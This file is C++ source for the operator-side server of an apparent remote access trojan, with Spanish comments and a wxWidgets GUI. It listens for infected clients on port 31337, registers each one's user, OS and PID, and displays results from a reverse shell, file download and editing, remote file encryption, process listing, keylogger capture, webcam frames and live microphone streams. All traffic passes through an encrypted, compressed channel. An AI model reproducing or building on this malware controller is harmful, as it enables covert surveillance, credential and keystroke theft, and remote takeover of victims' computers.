#include "server.hpp"
#include "misc.hpp"
#include "frame_client.hpp"
#include "frame_main.hpp"
#include "panel_file_manager.hpp"
#include "panel_process_manager.hpp"
#include "panel_keylogger.hpp"
#include "panel_camara.hpp"
#include "file_editor.hpp"

//Definir el servidor globalmente
Servidor* p_Servidor;
std::mutex vector_mutex;
std::mutex count_mutex;
std::mutex list_mutex;

bool Cliente_Handler::OpenPlayer() {
    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 2;
    wfx.nSamplesPerSec = 11025;
    wfx.wBitsPerSample = 16;
    wfx.nBlockAlign = wfx.wBitsPerSample * wfx.nChannels / 8;
    wfx.nAvgBytesPerSec = wfx.nBlockAlign * wfx.nSamplesPerSec;
    //wfx.cbSize = 0;
    // Abrir el dispositivo de reproducci�n de audio

    if (sizeof(wfx) != sizeof(WAVEFORMATEX)) {
        std::cerr << "Tama�o incorrecto de la estructura WAVEFORMATEX." << std::endl;
        return false;
    }

    // Intentar abrir el dispositivo de reproducci�n de audio
    if (waveOutOpen(&this->wo, WAVE_MAPPER, &wfx, NULL, NULL, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        std::cerr << "Error al abrir el dispositivo de reproducci�n de audio" << std::endl;
        return false;
    }
    return true;
}

void Cliente_Handler::PlayBuffer(char* pBuffer, size_t iLen){
    
    WAVEHDR header = {};
    header.dwFlags = 0;
    header.lpData = pBuffer;
    header.dwBufferLength = iLen;
     

    if (waveOutPrepareHeader(this->wo, &header, sizeof(header)) != MMSYSERR_NOERROR) {
        std::cerr << "Error al preparar el encabezado del buffer de audio" << std::endl;
        waveOutUnprepareHeader(this->wo, &header, sizeof(header));
        waveOutClose(this->wo);
        return;
    }

    if (waveOutWrite(this->wo, &header, sizeof(header)) != MMSYSERR_NOERROR) {
        std::cerr << "Error al escribir el buffer de audio en el dispositivo de reproducci�n" << std::endl;
        waveOutUnprepareHeader(this->wo, &header, sizeof(header));
        waveOutClose(this->wo);
        return;
    }

    while (waveOutUnprepareHeader(this->wo, &header, sizeof(header)) == WAVERR_STILLPLAYING) {
        Sleep(100); // Espera un poco antes de intentar nuevamente
    }
}

void Cliente_Handler::Spawn_Handler(){
    int iBufferSize = 1024 * 100; //100 kb
    std::unique_ptr<char[]> cBuffer = std::make_unique<char[]>(iBufferSize);
    DWORD error_code = 0;
    int iTempRecibido = 0;
    while (true) {
        if (!this->isfRunning() || this->p_Cliente._sckCliente == INVALID_SOCKET) {
            std::unique_lock<std::mutex> lock(this->mt_Running);
            this->iRecibido = WSA_FUNADO;
            break;
        }
        
        
        iTempRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer.get(), iBufferSize - 1, 0, true, &error_code);
        this->SetBytesRecibidos(iTempRecibido);

        //timeout
        if (error_code == WSAETIMEDOUT) {
            continue;
        }

        //No hay datos todavia, esperar un poco mas
        //if (WSAGetLastError() == WSAEWOULDBLOCK) {
        //    Sleep(10);
        //    continue;
        //}

        /*Desconexion del cliente
        Si no recibio nada y el error no es timeout*/
        if(this->BytesRecibidos() == WSAECONNRESET) {
            //Cambiar titulo de ventana si esta sigue abierta
            FrameCliente* temp_cli = (FrameCliente*)wxWindow::FindWindowByName(this->p_Cliente._id);
            if (temp_cli) {
                temp_cli->SetTitle(this->p_Cliente._id + " [DESCONECTADO]");
            }
            std::unique_lock<std::mutex> lock(this->mt_Running);
            this->iRecibido = WSA_FUNADO;
            break;
        }

        if (this->BytesRecibidos() <= 0) {
            continue;
        }

        cBuffer[this->BytesRecibidos()] = '\0';

        std::vector<std::string> vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 1);
        if (vcDatos.size() == 0) {
            this->Log("No se pudo procesar el buffer");
            continue;
        }

        //Prioridad para descarga de archivos
        if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Recibir)) {
            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
            if (vcDatos.size() == 2) {
                // CMD + 2 slashs /  +len del id
                int iHeader = 5 + vcDatos[1].size();
                int iBytesSize = this->BytesRecibidos() - iHeader;
                char* cBytes = cBuffer.get() + iHeader;

                FILE* fp = this->um_Archivos_Descarga[vcDatos[1]].iFP;
                if (fp) {
                    fwrite(cBytes, sizeof(char), iBytesSize, fp);
                    //Por los momentos solo es necesario que el servidor almacene el progreso
                    //this->um_Archivos_Descarga[vcDatos[1]].uDescargado += iBytesSize;

                    std::unique_lock<std::mutex> lock(p_Servidor->p_transfers);
                    p_Servidor->vcTransferencias[vcDatos[1]].uDescargado += iBytesSize;
                }
                else {
                    this->Log("El archivo no esta abierto");
                }
            }
            continue;
        }

        //Pquete inicial
        if (vcDatos[0] == "01") {
            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 5);
            if (vcDatos.size() < 4) {
                this->Log("Error procesando los datos " + std::string(cBuffer.get()));
                continue;;
            }
            struct Cliente structTmp;

            structTmp._strSo = this->p_Cliente._strSo = vcDatos[1];
            structTmp._strUser = this->p_Cliente._strUser = vcDatos[2];
            structTmp._strPID = this->p_Cliente._strPID = vcDatos[3];
            structTmp._strCpu = this->p_Cliente._strCpu = vcDatos[4];
            structTmp._id = this->p_Cliente._id;
            structTmp._strIp = this->p_Cliente._strIp;
            
            p_Servidor->m_InsertarCliente(structTmp);
            
            continue;
        }

        //Termino la shell
        if (vcDatos[0] == std::to_string(EnumComandos::Reverse_Shell_Finish)) { 
            this->EscribirSalidShell(std::string("Sapeeeeeeeeeeee"));
            continue;
        }

        //Salida de shell
        if (vcDatos[0] == std::to_string(EnumComandos::Reverse_Shell_Salida)) {
            int iCmdH = (std::to_string(EnumComandos::Reverse_Shell_Salida).size() + 1);
            char* pBuf = cBuffer.get() + iCmdH;
            this->EscribirSalidShell(std::string(pBuf));
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::FM_Dir_Folder)) {
            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
            if (vcDatos.size() == 2) {
                std::vector<std::string> vcFileEntry;
                wxString strTama = "-";
                if (vcDatos[1][1] == '>') {
                    //Dir
                    vcFileEntry = strSplit(vcDatos[1], '>', 4);
                }
                else if (vcDatos[1][1] == '<') {
                    //file
                    vcFileEntry = strSplit(vcDatos[1], '<', 4);
                    if (vcFileEntry.size() == 4) {
                        u64 bytes = StrToUint(vcFileEntry[2].c_str());
                        char* cDEN = "BKMGTP";
                        double factor = floor((vcFileEntry[2].size() - 1) / 3);
                        char cBuf[20];
                        snprintf(cBuf, 19, "%.2f %c", bytes / pow(1024, factor), cDEN[int(factor)]);
                        strTama = cBuf;
                    }
                }
                else {
                    //unknown
                    std::cout << "DESCONOCIDO: " << cBuffer << std::endl;
                }

                ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
                if (temp_list) {
                    if (vcFileEntry.size() >= 4) {
                        temp_list->ListarDir(vcFileEntry, strTama);
                    }
                }
            }
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::FM_Discos_Lista)) {
            char* pBuf = cBuffer.get() + 4;
            std::vector<std::string> vDrives = strSplit(std::string(pBuf), CMD_DEL, 100);

            if (vDrives.size() > 0) {
                ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
                if (temp_list) {
                    temp_list->ListarEquipo(vDrives);
                }
                
            }
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Init)) {
            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 3);
            if (vcDatos.size() == 3) {
                //Tama�o del archivo recibido
                u64 uTamArchivo = StrToUint(vcDatos[2].c_str());

                this->um_Archivos_Descarga[vcDatos[1]].uTamarchivo = uTamArchivo;

                std::unique_lock<std::mutex> lock(p_Servidor->p_transfers);
                p_Servidor->vcTransferencias[vcDatos[1]].uTamano = uTamArchivo;
                lock.unlock();

                std::cout << "[ID-" << vcDatos[1] << "]Tam archivo: " << uTamArchivo << std::endl;
            }
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_End)) {
            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
            if (vcDatos.size() == 2) {
                if (this->um_Archivos_Descarga[vcDatos[1]].iFP) {
                    fclose(this->um_Archivos_Descarga[vcDatos[1]].iFP);
                }

                this->Log("[!] Descarga completa");
            }
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::FM_Editar_Archivo_Paquete)) {
            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
            if (vcDatos.size() == 2) {
                //Tama�o del id del comando, id del archivo y dos back slashes
                int iHeadSize = 2 + vcDatos[0].size() + vcDatos[1].size();
                char* cBytes = cBuffer.get() + iHeadSize;

                wxEditForm* temp_edit_form = (wxEditForm*)wxWindow::FindWindowByName(vcDatos[1], this->n_Frame);
                if (temp_edit_form) {
                    temp_edit_form->p_txtEditor->AppendText(wxString(cBytes));
                    temp_edit_form->p_txtEditor->SetInsertionPoint(0);
                    ;
                }
                else {
                    this->Log("No se pudo encontrar la ventana con id " + vcDatos[1]);
                }
            }
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::FM_Crypt_Confirm)) {
            //Confirmacion de cifrado
            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
            if (vcDatos.size() == 2) {
                wxString strMessage = "";
                if (vcDatos[1] == "1") {
                    strMessage = "[CRYPT] No se pudo abrir el archivo de entrada";
                }
                else if (vcDatos[1] == "2") {
                    strMessage = "[CRYPT] No se pudo abrir el archivo de salida";
                }
                else if (vcDatos[1] == "3") {
                    strMessage = "[CYRPT] Operacion completada";
                }

                wxMessageBox(strMessage, "Cifrado de archivos", wxOK, nullptr);
            }
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::FM_CPATH)) {
            panelFileManager* temp_panel = (panelFileManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM, this->n_Frame);
            if (temp_panel) {
                temp_panel->p_RutaActual->SetLabelText(wxString(cBuffer.get() + 4));
                temp_panel->c_RutaActual.clear();
                std::vector<std::string> vcSubRutas = strSplit(cBuffer.get() + 4, CMD_DEL, 100);
                for (auto item : vcSubRutas) {
                    std::string strTemp = item;
                    strTemp += "\\";
                    temp_panel->c_RutaActual.push_back(strTemp);
                }
            }
            else {
                this->Log("No se pudo encontrar panel FM activo");
            }
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::PM_Lista)) {
            char* cData = cBuffer.get() + vcDatos[0].size() + 1;
            panelProcessManager* panel_proc = (panelProcessManager*)wxWindow::FindWindowById(EnumIDS::ID_PM_Panel, this->n_Frame);
            if (panel_proc) {
                panel_proc->listManager->AgregarData(std::string(cData), this->p_Cliente._strPID);
            }
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::KL_Salida)) {
            panelKeylogger* temp_panel = (panelKeylogger*)wxWindow::FindWindowById(EnumIDS::ID_KL_Panel, this->n_Frame);
            if (temp_panel) {
                char* cKeyData = cBuffer.get() + (vcDatos[0].size() + 1);
                temp_panel->txt_Data->AppendText(cKeyData);
            }else {
                this->Log("[X] No se pudo encontrar el panel keylogger");
            }
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::CM_Lista_Salida)) {
            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
            if (vcDatos.size() == 2) {
                std::vector<std::string> vcCams = strSplit(vcDatos[1], '|', 50);
                if (vcCams.size() > 0) {
                    wxComboBox* panel_cam_combo = (wxComboBox*)wxWindow::FindWindowById(EnumCamMenu::ID_Combo_Devices, this->n_Frame);
                    if (panel_cam_combo) {
                        wxArrayString arrCams;
                        for (std::string cCam : vcCams) {
                            arrCams.push_back(cCam);
                        }
                        panel_cam_combo->Clear();
                        panel_cam_combo->Append(arrCams);
                    }
                }
            }
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::CM_Single_Salida)){
            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
            if (vcDatos.size() == 2) {
                //CMD DEL ID_DEV DEL BUFFER
                this->Log(cBuffer.get());
                int iHeadSize = (std::to_string(EnumComandos::CM_Single_Salida).size() + 2) + vcDatos[1].size(); //CMD + len de dos delimitador + len del id del dev
                int iBuffSize = this->BytesRecibidos() - iHeadSize;
                char* cBytes = cBuffer.get() + iHeadSize;
                panelPictureBox* panel_picture = (panelPictureBox*)wxWindow::FindWindowByName("CAM" + vcDatos[1], this->n_Frame);
                if (panel_picture) {
                    if (panel_picture->iBufferSize > 0) {
                        delete[] panel_picture->cPictureBuffer;
                    }
                    panel_picture->cPictureBuffer = DBG_NEW char[iBuffSize];
                    if (panel_picture->cPictureBuffer) {
                        memcpy(panel_picture->cPictureBuffer, cBytes, iBuffSize);
                        panel_picture->iBufferSize = iBuffSize;
                        panel_picture->OnDrawBuffer();
                    }
                    else {
                        this->Log("[X][MOD-CAM] No se pudo allocar memoria para copiar los bytes");
                    }

                }
                else {
                    this->Log("[X] No se pudo encontrar el panel de camara");
                }
            }
            continue;
;        }

        if (vcDatos[0] == std::to_string(EnumComandos::Mic_Refre_Resultado)) {
            vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 15);
            if (vcDatos.size() > 0) {
                wxArrayString cli_devices;
                for (int i = 1; i<int(vcDatos.size()); i++) {
                    cli_devices.push_back(vcDatos[i]);
                }

                panelMicrophone* temp_panel = (panelMicrophone*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Microphone, this->n_Frame);
                if (temp_panel) {
                    wxComboBox* temp_combo_box = (wxComboBox*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Mic_CMB_Devices, temp_panel);
                    if (temp_combo_box) {
                        temp_combo_box->Clear();
                        temp_combo_box->Append(cli_devices);
                    }
                }
                else {
                    std::cout << "No se pudo encontrar ventana activa\n";
                }
            }
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::Mic_Live_Packet)) {
            if (this->OpenPlayer()) {
                int iHeadSize = vcDatos[0].size() + 1;
                int iRawSize = this->BytesRecibidos() - iHeadSize;
                char* cBuff = cBuffer.get() + iHeadSize;
                this->PlayBuffer(cBuff, iRawSize);

                this->ClosePlayer();
            }else {
                this->Log("No se pudo abrir el reproductor");
            }
            continue;
        }

    }

    this->Log("Done");


}

void Cliente_Handler::EscribirSalidShell(std::string strSalida) {
    panelReverseShell* panel_shell = (panelReverseShell*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Reverse_Shell, this->n_Frame);
    if (panel_shell) {
        panel_shell->txtConsole->AppendText(strSalida);
        int iLast = panel_shell->txtConsole->GetLastPosition();
        panel_shell->p_uliUltimo = iLast;
    }
}

void Cliente_Handler::Spawn_Thread() {
    this->p_thHilo = std::thread(&Cliente_Handler::Spawn_Handler, this);
}

//funcion que crea el frame principal para interactuar con el cliente
void Cliente_Handler::CrearFrame(std::string strTitle, std::string strID) {
    this->n_Frame = DBG_NEW FrameCliente(strTitle, this->p_Cliente._sckCliente, this->p_Cliente._strIp);
    this->n_Frame->Show(true);
}

void MyLogClass::LogThis(std::string strInput, int iType){
    time_t temp = time(0);
    struct tm *timeptr = localtime(&temp);

    std::string strLine = "";
    
    switch (iType){
        case LogType::LogMessage:
            strLine = "[-] ";
            break;
        case LogType::LogError:
            strLine = "[X] ";
            break;
        case LogType::LogWarning:
            strLine = "[!] ";
            break;
        default:
            strLine = "[-] ";
            break; 
    }
    
    strLine += "[" + std::to_string(timeptr->tm_hour);
    strLine += ":" + std::to_string(timeptr->tm_min) + ":";
    strLine += std::to_string(timeptr->tm_sec) + "]  ";
    strLine += strInput + "\n";

   // std::lock_guard<std::mutex> lock(this->log_mutex);
    if (this->p_txtCtrl != nullptr) {
        this->p_txtCtrl->AppendText(strLine);
    }

}

void Servidor::Init_Key() {
    for (unsigned char i = 0; i < AES_KEY_LEN; i++) {
        this->bKey.push_back(this->t_key[i]);
    }
}

Servidor::Servidor(){
    this->uiPuertoLocal = 31337;

    //clase para logear
    this->m_txtLog = DBG_NEW MyLogClass();

    this->Init_Key();

}

bool Servidor::m_Iniciar(){
    WSACleanup();
    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0){
        return false;
    }

    this->sckSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if(!this->sckSocket){
        this->m_txtLog->LogThis("No se pudo crear el socket", LogType::LogError);
        return false;
    }

    int iTemp = 1;
    if(setsockopt(this->sckSocket, SOL_SOCKET, SO_REUSEADDR, (const char*)&iTemp, sizeof(int)) < 0){
        this->m_txtLog->LogThis("Error configurando el socket SO_REUSEADDR", LogType::LogError);
        return false;
    }

    unsigned long int iBlock = 1;
    if(ioctlsocket(this->sckSocket, FIONBIO, &iBlock) != 0){
        this->m_txtLog->LogThis("Error configurando el socket NON_BLOCK", LogType::LogError);
        error();
        return false;
    }

    this->structServer.sin_family        =                    AF_INET;
    this->structServer.sin_port          = htons(this->uiPuertoLocal);
    this->structServer.sin_addr.s_addr =                 INADDR_ANY;

    if(bind(this->sckSocket, (struct sockaddr *)&this->structServer, sizeof(struct sockaddr)) == -1){
        this->m_txtLog->LogThis("Error configurando el socket BIND", LogType::LogError);
        return false;
    }

    if(listen(this->sckSocket, 10) == -1){
        this->m_txtLog->LogThis("Error configurando el socket LISTEN", LogType::LogError);
        return false;
    }

    return true;
}

ClientConInfo Servidor::m_Aceptar(){
    struct ClientConInfo structNuevo;
    struct sockaddr_in structCliente;
    int iTempC = sizeof(struct sockaddr_in);
    SOCKET tmpSck = accept(this->sckSocket, (struct sockaddr *)&structCliente, &iTempC) ;
    if(tmpSck != INVALID_SOCKET){
        char strIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(structCliente.sin_addr), strIP, INET_ADDRSTRLEN);
        std::string strTmp = "Nueva conexion de ";
        strTmp += strIP;
        strTmp +=  ":" + std::to_string(ntohs(structCliente.sin_port));
        
        this->m_txtLog->LogThis(strTmp, LogType::LogMessage);

        DWORD timeout = CLI_TIMEOUT_SECS * 100;
        setsockopt(tmpSck, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof timeout);
        
        structNuevo._strPuerto = std::to_string(ntohs(structCliente.sin_port));
        structNuevo._sckSocket = tmpSck;
        structNuevo._strIp = strIP;
    } else {
        structNuevo._sckSocket = tmpSck;
    }
        
    return structNuevo;
}

void Servidor::m_Handler(){
    this->p_Escuchando = true;

    this->thListener = std::thread(&Servidor::m_Escucha, this);
    this->thCleanVC = std::thread(&Servidor::m_CleanVector, this);
}

void Servidor::m_JoinThreads() {
    if (this->thCleanVC.joinable()) {
        this->thCleanVC.join();
    }

    if (this->thListener.joinable()) {
        this->thListener.join();
    }

    this->m_txtLog->LogThis("Thread LISTENER terminada", LogType::LogMessage);
}

void Servidor::m_StopHandler() {
    this->m_txtLog->LogThis("Apagando", LogType::LogError);
    std::lock_guard<std::mutex> lock(this->p_mutex);
    this->p_Escuchando = false;
    m_CerrarConexion(this->sckSocket);
}

void Servidor::m_CerrarConexion(SOCKET pSocket) {
    if (pSocket != INVALID_SOCKET) {
        std::cout << "Cerrando socket " << pSocket << "\n";
        closesocket(pSocket);
        pSocket = INVALID_SOCKET;
    }
}

void Servidor::m_CerrarConexiones() {
    std::unique_lock<std::mutex> lock(vector_mutex); //<------------------------------- DBG_NEW
    if (this->vc_Clientes.size() > 0) {
        for(int iIndex = 0; iIndex<int(this->vc_Clientes.size()); iIndex++){
            this->m_CerrarConexion(this->vc_Clientes[iIndex]->p_Cliente._sckCliente);
        }
    }
    
    m_CerrarConexion(this->sckSocket);
}

void Servidor::m_CleanVector() {
    while (true) {
        if (!this->m_Running()) {
            break;
        }
    
        Sleep(100);
        int iNumeroClientes = this->m_NumeroClientes(vector_mutex);
        if (iNumeroClientes == 0) {
            continue;
        }
        
        for(int iIndex = 0; iIndex < iNumeroClientes; iIndex++){
            if(!this->m_IsRunning(vector_mutex, iIndex) && this->m_Running()){
                std::string streTempID = this->m_ClienteID(vector_mutex, iIndex);
                
                this->m_RemoverClienteLista(streTempID);
                
                std::string strTmp = "Cliente " + this->m_ClienteIP(vector_mutex, iIndex) + " - desconectado";
                this->m_txtLog->LogThis(strTmp, LogType::LogMessage);

                this->m_BorrarCliente(vector_mutex, iIndex);

            }else if (!this->m_Running()) {
                //Cerra el loop y no iterar por todos si ya no esta escuchando
                break;
            }
        }
    }
    std::cout << "Thread CLEANER terminada\n";
    

    for (int iIndex2 = 0; iIndex2 < this->m_NumeroClientes(vector_mutex); iIndex2++) {
        this->m_BorrarCliente(vector_mutex, iIndex2);
    }

    this->vc_Clientes.clear();
}

/*
void Servidor::m_Ping(){
    this->m_txtLog->LogThis("Thread PING iniciada", LogType::LogMessage);
    
    while(this->p_Escuchando){
        //Si no hay clientes seguir en el loop para cerrar thread mas rapido
        std::unique_lock<std::mutex> lock(this->count_mutex);
        if (this->iCount <= 0) {
            lock.unlock();
            Sleep(100);
            continue;
        }
        lock.unlock();
        
        std::unique_lock<std::mutex> lock2(vector_mutex);
        
        for(auto it = this->um_Clientes.begin(); it != this->um_Clientes.end();){
            if ((time(0) - it->second._ttUltimaVez) <= PING_TIME) {
                    ++it;
                    continue;
            } else {
                if (!it->second._isBusy) {
                    //Si no esta activo enviar el ping
                    std::string strData = std::to_string(EnumComandos::PING);
                    strData.append(1, CMD_DEL);
                    int iBytes = this->cSend(it->second._sckCliente, strData.c_str(), strData.size(), 0, false);
                    if (iBytes <= 0) {
                        //No se pudo enviar el ping
                        std::string strTmp = "Cliente " + it->second._strIp + "-" + it->second._id + " desconectado";
                        this->m_txtLog->LogThis(strTmp, LogType::LogMessage);

                        FrameCliente* temp = (FrameCliente*)wxWindow::FindWindowByName(it->second._id);
                        if (temp) {
                            wxString strTmp = it->second._id;
                            strTmp.append(1, '>');
                            strTmp += " desconectado";
                            temp->SetTitle(strTmp);
                        } else {
                            std::cout << "No se pudo encontrar el objeto\n";
                        }

                        this->m_RemoverClienteLista(it->second._id);
                        //Remover aqui del mapa, mover uno antes de moverlo
                        auto nIT = it;
                        ++it;
                        this->um_Clientes.erase(nIT);

                        std::unique_lock<std::mutex> lock3(this->count_mutex);
                        this->iCount--;
                        lock3.unlock();
                    } else {
                        it->second._ttUltimaVez = time(0);
                        ++it;
                    }
                } else {
                    ++it;
                }
            }
        }
        lock2.unlock(); //desbloquear vector
    }
}
*/

void Servidor::m_MonitorTransferencias() {
    while (true){
        std::unique_lock<std::mutex> lock(this->p_transfers);
        if (!this->p_Transferencias) {
            break;
        }
        lock.unlock();

        auto parent = (wxFrame*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Transferencias);
        if (parent) {
            auto list_transfer = (wxListCtrl*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Transferencias_List, parent);
            if (list_transfer) {
                list_transfer->DeleteAllItems();

                std::unique_lock<std::mutex> lock2(this->p_transfers);
                int iRowCount = 0;
                for (auto& tc : this->vcTransferencias) {
                    list_transfer->InsertItem(iRowCount, wxString(tc.second.strCliente));
                    list_transfer->SetItem(iRowCount, 1, wxString(tc.second.strNombre));
                    list_transfer->SetItem(iRowCount, 2, wxString(tc.second.uDescargado >= tc.second.uTamano ? "TRANSFERIDO" : (tc.second.isUpload ? "SUBIENDO" : "DESCARGANDO")));

                    double dPercentage = (tc.second.uDescargado / tc.second.uTamano) * 100;
                    wxString strPor = std::to_string(dPercentage);
                    strPor.append(1, '%');
                    list_transfer->SetItem(iRowCount++, 3, wxString(strPor));
                }
            } else {
                std::cout << "No se pudo encontrar el list abierto" << std::endl;
            }
        }else {
            std::cout << "No se pudo encontrar el panel abierto" << std::endl;
        }
        Sleep(1000);
    }
    
}

void Servidor::m_Escucha(){
    this->m_txtLog->LogThis("Thread LISTENER iniciada", LogType::LogMessage);
    
    //Crear descriptor and setearlo a zero
    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    
    fd_set fdMaster;
    FD_ZERO(&fdMaster);
    FD_SET(this->sckSocket, &fdMaster);
    
    while(this->m_Running()){
        fd_set fdMaster_copy = fdMaster;
        
        int iNumeroSockets = select(this->sckSocket + 1, &fdMaster_copy, nullptr, nullptr, &timeout);
        for (int iCont = 0; iCont < iNumeroSockets; iCont++) {
            SOCKET iSock = fdMaster_copy.fd_array[iCont];

            if (iSock == this->sckSocket) {
                //Nueva conexion
                struct ClientConInfo sckNuevoCliente = this->m_Aceptar();
                if (sckNuevoCliente._sckSocket == INVALID_SOCKET) {
                    //socket invalido
                    continue;
                }
                //IP:PUERTO
                std::string strtmpIP = sckNuevoCliente._strIp;
                strtmpIP.append(1, ':');
                strtmpIP.append(sckNuevoCliente._strPuerto);

                //RANDOM ID
                std::string strTmpId = RandomID(7);
                strTmpId.append(1, '-');
                strTmpId += std::to_string(sckNuevoCliente._sckSocket);

                struct Cliente structNuevoCliente;
                structNuevoCliente._sckCliente = sckNuevoCliente._sckSocket;
                structNuevoCliente._ttUltimaVez = time(0);
                structNuevoCliente._id = strTmpId;
                structNuevoCliente._strIp = strtmpIP;

                
                //Agregar el cliente al vector global - se agrega a la list una vez se reciba la info
                std::unique_lock<std::mutex> lock(vector_mutex);
                Cliente_Handler* nCliente = DBG_NEW Cliente_Handler(structNuevoCliente);
                this->vc_Clientes.push_back(nCliente);
                this->vc_Clientes[this->vc_Clientes.size() - 1]->Spawn_Thread();

            }

        }
    }
    std::cout<<"DONE Listen" << std::endl;
}

int Servidor::IndexOf(std::string strID) {
    std::lock_guard<std::mutex> lock(vector_mutex);
    bool isFound = false;
    int iIndex = 0;
    for (; iIndex < this->vc_Clientes.size(); iIndex++) {
        if (this->vc_Clientes[iIndex]->p_Cliente._id == strID) {
            isFound = true;
            break;
        }
    }
    
    if (!isFound) { iIndex = -1; }

    return iIndex;
}

void Servidor::m_InsertarCliente(struct Cliente& p_Cliente){
    std::unique_lock<std::mutex> lock(list_mutex);

    int iIndex = this->m_listCtrl->GetItemCount();

    this->m_listCtrl->InsertItem(iIndex, wxString(p_Cliente._id));
    this->m_listCtrl->SetItem(iIndex, 1, wxString(p_Cliente._strUser));
    this->m_listCtrl->SetItem(iIndex, 2, wxString(p_Cliente._strIp));
    this->m_listCtrl->SetItem(iIndex, 3, wxString(p_Cliente._strSo));
    this->m_listCtrl->SetItem(iIndex, 4, wxString(p_Cliente._strPID));
    this->m_listCtrl->SetItem(iIndex, 5, wxString(p_Cliente._strCpu));
}

void Servidor::m_RemoverClienteLista(std::string p_ID){
    std::unique_lock<std::mutex> lock(list_mutex);

    long lFound = this->m_listCtrl->FindItem(0, wxString(p_ID));
    if(lFound != wxNOT_FOUND){
        this->m_listCtrl->DeleteItem(lFound);
    } else{
        error();
    }
    
}

int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock) {
    // 1 non block
    // 0 block

    //Tamaño del buffer + cabecera
    int iDataSize = pLen + 2;

    std::unique_ptr<char[]> new_Buffer = std::make_unique<char[]>(iDataSize);
    if (!new_Buffer) {
        std::cout << "No se pudo reservar la memoria\n";
        return -1;
    }

    //por defecto la cabecera se seteara como descomprimido
    // esto solo cambia si no hay ningun error durante el proceso de compresion
    new_Buffer[0] = UNCOMP_HEADER_BYTE_1;
    new_Buffer[1] = COMP_HEADER_BYTE_2;
    
    //Primero comprimir si el paquete es mayor a 1024 bytes
    if (pLen > BUFFER_COMP_REQ_LEN) {
        //Comprimir  buffer
        std::shared_ptr<unsigned char[]> compData(new unsigned char[iDataSize * 3]);
        if (compData) {
            unsigned long out_len = iDataSize;
            int iRet = compress(compData.get(), &out_len, reinterpret_cast<const unsigned char*>(pBuffer), pLen);
            if (iRet == Z_OK) {
                //Success
                if (out_len < iDataSize) {
                    new_Buffer[0] = COMP_HEADER_BYTE_1;
                    std::memcpy(new_Buffer.get() + 2, compData.get(), out_len);
                    iDataSize = out_len + 2; //Cantidad de bytes que fueron comprimidos + cabecera (2 bytes)
                }else {
                    //El buffer compreso es mayor al original, copiar el mismo buffer
                    std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
                }
            }else if (iRet == Z_MEM_ERROR) {
                std::cout << "No hay memoria suficiente\n";
                std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
            }else if (iRet == Z_BUF_ERROR) {
                std::cout << "El output no tiene memoria suficiente\n";
                std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
            }else {
                std::cout << "A jaber que pajo\n";
                std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
            }
        }else {
            std::cout << "No se pudo reservar memoria para el buffer de compression\n";
            //Copiar buffer original
            std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
        }

    }else {
        //No comprimir ya que el buffer no es tan grande
        std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
    }

    //Vector que aloja el buffer cifrado
    ByteArray cData = this->bEnc(reinterpret_cast<const unsigned char*>(new_Buffer.get()), iDataSize);
    iDataSize = cData.size();
    if (iDataSize == 0) {
        error();
        return -1;
    }

    int iEnviado = 0;
    unsigned long int iBlock = 0;

    if (isBlock) {
        //Hacer el socket block
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            this->m_txtLog->LogThis("Error configurando el socket NON_BLOCK", LogType::LogError);
        }
    }

    iEnviado = send(pSocket, reinterpret_cast<const char*>(cData.data()), iDataSize, pFlags);
        
    //Restaurar
    if (isBlock) {
        iBlock = 1;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            this->m_txtLog->LogThis("Error configurando el socket NON_BLOCK", LogType::LogError);
        }
    }
    
    return iEnviado;
}

